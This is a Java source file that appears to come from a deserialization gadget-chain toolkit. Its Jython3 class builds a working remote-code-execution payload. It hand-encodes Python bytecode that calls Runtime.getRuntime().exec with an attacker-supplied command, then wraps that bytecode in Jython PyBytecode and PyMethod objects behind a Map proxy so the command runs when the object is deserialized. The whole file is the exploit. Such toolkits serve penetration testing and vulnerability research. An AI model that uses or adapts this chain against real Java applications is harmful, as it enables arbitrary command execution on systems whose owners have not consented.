package org.ses.gadgetbuilder.chains1;

import org.python.core.*;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.MapEntrySetTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.lang.reflect.Constructor;
import java.lang.reflect.Proxy;
import java.math.BigInteger;
import java.util.Map;


@Dependencies({ "org.python:jython:2.7.2b2" })
@Authors({ Authors.JACKOFMOSTTRADES })
@Impact(Impact.RCE)
public class Jython3 extends GadgetChain<MapEntrySetTrampoline> {
    public Jython3(MapEntrySetTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        // Python bytecode from the following source:
        //     from java.lang import Runtime
        //     Runtime.getRuntime().exec('command').waitFor()
        String code =
                "640100" + //0 LOAD_CONST                1 (0)
                        "640200" + //3 LOAD_CONST                2 (('Runtime',))
                        "6c0000" + //6 IMPORT_NAME               0 (java.lang)
                        "6d0100" + //9 IMPORT_FROM               1 (Runtime)
                        "7d0000" + //12 STORE_FAST               0 (Runtime)
                        "01" +     //15 POP_TOP

                        "7c0000" + //16 LOAD_FAST                0 (Runtime)
                        "6a0200" + //19 LOAD_ATTR                2 (getRuntime)
                        "830000" + //22 CALL_FUNCTION            0
                        "6a0300" + //25 LOAD_ATTR                3 (exec)
                        "640300" + //28 LOAD_CONST               3 ('command')
                        "830100" + //31 CALL_FUNCTION            1
                        "6a0400" + //34 LOAD_ATTR                4 (waitFor)
                        "830000" + //37 CALL_FUNCTION            0
                        "01" +     //40 POP_TOP
                        "640000" + //41 LOAD_CONST               0 (None)
                        "53"       //34 RETURN_VALUE
                ;

        // Helping consts and names
        PyObject[] consts = new PyObject[]{Py.None, new PyInteger(0), new PyTuple(new PyString("Runtime")), new PyString(command)};
        String[] names = new String[]{"java.lang", "Runtime", "getRuntime", "exec", "waitFor"};

        // Generating PyBytecode wrapper for our python bytecode
        PyBytecode codeobj = new PyBytecode(0, 1, 2, 67, "", consts, names, new String[]{ "", "" }, "noname", "<module>", 0, "");
        Reflections.setFieldValue(codeobj, "co_code", new BigInteger(code, 16).toByteArray());

        Constructor<?> cons = Class.forName("org.python.core.BuiltinFunctions").getConstructor(String.class, int.class, int.class);
        cons.setAccessible(true);
        PyObject payloadclass = (PyObject) cons.newInstance("", 18, 3);
        PyMethod wrapperOne = new PyMethod(payloadclass, codeobj, null);
        PyMethod wrapperTwo = new PyMethod(wrapperOne, new PyStringMap(), null);

        Map<String, Object> proxyMap = (Map<String, Object>) Proxy.newProxyInstance(this.getClass().getClassLoader(), new Class[]{Map.class}, wrapperTwo);

        return new TrampolineConnector(proxyMap);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "Map.entrySet() [Implemented as a proxy class with PyMethod InvocationHandler]\n" +
                "org.python.core.PyMethod.__call__()\n" +
                "org.python.core.PyMethod.__call__(state)\n" +
                "org.python.core.PyMethod.__call__(state, arg0)\n" +
                "org.python.core.BuiltinFunctions.__call__(state, arg0, arg1)\n" +
                "org.python.core.__builtin__.eval(arg1, arg2, arg3)\n" +
                "org.python.core.Py.runCode(code, locals, globals);";
    }
}
